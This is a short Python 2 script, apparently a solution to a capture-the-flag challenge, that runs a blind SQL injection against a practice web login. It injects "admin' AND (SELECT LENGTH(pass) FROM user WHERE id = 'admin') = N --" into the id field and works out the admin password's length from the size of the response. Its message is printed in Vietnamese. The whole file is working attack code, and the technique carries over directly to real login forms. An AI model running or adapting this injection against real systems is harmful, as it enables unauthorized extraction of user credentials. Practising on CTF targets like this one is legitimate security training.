import urllib
import urllib2

url = "http://ctfq.sweetduet.info:10080/~q6/"

def main():
    for i in range(1, 100):
        data = {
            "id": "admin' AND (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {counter} --".format(counter=i),
            "pass": "",
        }
        print (data)
        data1 = urllib.urlencode(data).encode("utf-8")
        req = urllib2.Request(url, data1)
        res = urllib2.urlopen(req)
        print (res)
        if int(res.headers["content-length"]) > 2000:
            print("Do dai cua password: {counter}".format(counter=i))
            break
if __name__ == "__main__":
    main()